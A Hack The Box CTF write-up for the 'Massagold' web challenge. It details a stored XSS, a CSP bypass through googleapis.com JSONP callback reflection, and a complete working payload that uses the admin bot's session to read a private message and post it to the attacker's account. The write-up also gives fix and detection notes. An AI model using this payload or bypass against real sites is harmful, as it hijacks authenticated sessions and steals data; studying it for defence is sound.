---
title: Massagold (Rookery) — stored XSS → JSONP CSP bypass → in-band flag exfil
platform: Hack The Box
event: "Cyber Apocalypse CTF 2026: The Salt Crown"
challenge: Massagold
app: Rookery
category: web
difficulty: very easy
type: writeup
status: complete
mitre:
  - T1190
  - T1059.007
  - T1185
tags:
  - writeup
  - HTB
  - Web_App_Security
  - Security
  - xss
  - stored-xss
  - csp-bypass
  - jsonp
related: []
aliases:
  - Massagold
  - Rookery
  - CA2026 Massagold
created: 2026-07-24T16:57:33.421Z
updated: 2026-07-24T16:57:33.421Z
---

# Massagold (Rookery) — Stored XSS → JSONP CSP Bypass → In-Band Exfil

> [!success] Scope
> Authorized HTB event challenge, Cyber Apocalypse CTF 2026. Node/Express + EJS raven-messaging app ("Rookery") with an admin bot. Instance was ephemeral — ports `32446`, later `32702`. Solved 2026-07-24.

**Flag:** `HTB{m3554g3_1n_7h3_cu570dy_ch41n_dca942db9e87446846aa668eb0b9198c}`

---

## 1. The vulnerability

`app/views/message.ejs` renders message content **unescaped** while every other field is escaped:

```ejs
<strong>From: <%= message.sender_username %></strong>
<pre class="letter-copy"><%- message.content %></pre>
```

`<%-` is raw output; `<%=` is escaped. `messageController.sendMessage` applies **no sanitisation** — only `.trim()`. Stored XSS with no filter.

## 2. The trigger

Sending to `admin` queues a headless bot visit:

```js
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

`bot/bot.js` launches Playwright **Firefox**, logs in with real admin credentials read from `/app/admin_credentials.json`, visits `/messages/<id>`, waits 2000 ms, closes. It never clicks the seal — the injected content sits inside a `hidden` section, which is irrelevant to script execution.

## 3. The flag's location

`entrypoint.js` seeds the flag as the **first** message, `archivist` → `admin`:

```js
await createMessage(users.archivist, users.admin,
  `Archive notice:\n\nThe sealed royal record reads:\n${flag}`);
```

So it is message id `1`, and `showMessage` gates on `messages.recipient_id = req.session.user.id` — only an admin session can read it.

## 4. The constraint box

CSP served on every response by `app/server.js`:

```
default-src 'self'; script-src 'self' https://www.googleapis.com;
style-src 'self'; img-src 'self' data:; font-src 'self' data:;
connect-src 'self'; object-src 'none'; form-action 'self';
frame-ancestors 'none'
```

| Blocked | Why |
|---|---|
| `<script>` inline, `onerror=`, `onload=` | no `'unsafe-inline'` |
| `eval()`, `new Function()`, string `setTimeout` | no `'unsafe-eval'` |
| outbound exfil (fetch / img / form POST) | `connect-src`, `img-src`, `form-action` all `'self'` |
| cookie theft | session cookie is `httpOnly` |
| `<script src="/messages/N">` | no `nosniff`, but body starts `<!doctype html>` — invalid JS |

`style-src 'self'` also rules out CSS-based exfil. There is **no outbound channel of any kind.**

## 5. The bypass — JSONP callback echo

`https://www.googleapis.com` is allow-listed in `script-src`. Its JSONP endpoint **echoes the `callback` parameter verbatim** into a `text/javascript` response — even while rejecting it as an invalid name:

```js
// API callback
(function(){ ... })({
  "error": { "code": 400,
    "message": "Invalid JSONP callback name: '...'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed." }
});
```

The rejection is cosmetic. The echo is **arbitrary JavaScript execution from an allow-listed origin** — no gadget, no bootstrap, no `eval` required. The code goes straight in the query string.

> [!warning] Two encoding constraints, both found empirically
> - `&` → `%26` and `+` → `%2B`, or the query string terminates early / decodes to a space.
> - Google escapes `>` to `\u003e`. A Unicode escape is only valid in identifiers or strings, so **`=>` becomes a SyntaxError.** Arrow functions are unusable — use the `function` keyword. `<` is presumed escaped identically.

## 6. Exfil — inbound, not outbound

With no outbound channel, the flag is exfiltrated **through the application itself**: the payload fetches `/messages/1` as admin and POSTs the body back as a new message to the attacker account. Same-origin throughout, so `connect-src 'self'` permits it and no collaborator server is needed.

Field names matter — `sendMessage` reads only `to_username` and `content`, and the POST target is `/messages` (not `/messages/new`, which is GET-only).

## 7. Final payload

Sent as the message body to `admin`:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=(function(){fetch('/messages/1').then(function(r){return r.text()}).then(function(t){fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to_username=userfree%26content='%2BencodeURIComponent(t)})})})"></script>
```

Observed request chain in the bot's session:

```
GET  200  googleapis.com/customsearch/v1?callback=(function(){...})
GET  200  /messages/1
POST 302  /messages
GET  200  /
```

The rendered `/messages/1` document lands in the attacker inbox, flag inside the `<pre class="letter-copy">`.

> [!tip] Rehearse under your own session first
> Identical payload sent to your own account returns `404` on `/messages/1` and exfils the string `Message not found`. That is a **successful** dry run — it proves fetch, chain, and POST all work; only the session differs.

---

## Tools & techniques
Browser devtools (HAR + console) · Playwright (bot harness) · Docker Compose (local instance)
Concepts: stored XSS · CSP allow-list abuse · JSONP callback reflection · in-band (same-origin) exfiltration

## MITRE ATT&CK
- **T1190** Exploit Public-Facing Application (stored XSS sink)
- **T1059.007** Command and Scripting Interpreter: JavaScript
- **T1185** Browser Session Hijacking (actions executed in the admin's authenticated session)

## Detection / blue-team & fix notes
- **Fix (primary):** escape message content — `<%= %>` not `<%- %>`. Output encoding is the actual defect; CSP was compensating control only.
- **Fix (CSP):** never allow-list a broad third-party origin in `script-src`. `www.googleapis.com` hosts JSONP endpoints that reflect caller-controlled strings into executable responses, which converts an allow-list entry into arbitrary execution. Prefer nonces or hashes.
- **Detection:** an authenticated session issuing a `GET` for a resource it never navigated to, followed immediately by a self-addressed `POST` carrying that resource's body, is the signature. Outbound `script` loads to API hosts with executable-looking `callback` values are a second IOC.
- **Note:** `httpOnly`, `connect-src 'self'`, and `form-action 'self'` all held. They stopped exfil *outbound* and simply redirected it *in-band* — worth remembering that same-origin write endpoints are an exfil channel.

## Blind alleys (recorded to save the next reader)
- `<img src=x onerror=...>` — inline handler, blocked by CSP.
- `eval(p.title)` bootstrap via a `title`-attribute payload store — `eval` blocked by CSP (no `'unsafe-eval'`). This cost the most time.
- Form gadget: `<form id="f">` + `callback=f.submit` — **works**, fires as admin, but a form submit performs a write and reads nothing, so it cannot carry the flag.
- Same-origin script gadget in `/assets/message.js` or `/assets/compose.js` — `message.js` uses `textContent` only; `compose.js` has a real CSS-selector injection and an assignment primitive but needs `requestSubmit()` (not `submit()`) to fire, and still cannot cross documents.
- Username as a second injection vector — `inbox.ejs` escapes everything.
- Brute-forcing admin — password is `crypto.randomBytes(24)` base64url, bcrypt cost 10. Not attackable.

## Gotchas
- Filter inbox links with `\d+`, not `[a-zA-Z0-9_-]+` — the latter matches `/messages/new`, which has no `<pre>`, so `querySelector('pre').textContent` throws and silently kills the whole promise chain.
- Host must be `www.googleapis.com` **exactly**; `googleapis.com` fails CSP host matching (`status: 0`, request never leaves the browser).
- `messages` table carries an unused `location_url` column — no code touches it.

## Cross-references
- No cross-references outside this repository.

## Change Log
- 2026-07-24 — Initial write-up. Flag, payload, CSP text, and observed request chain preserved verbatim from the live run.
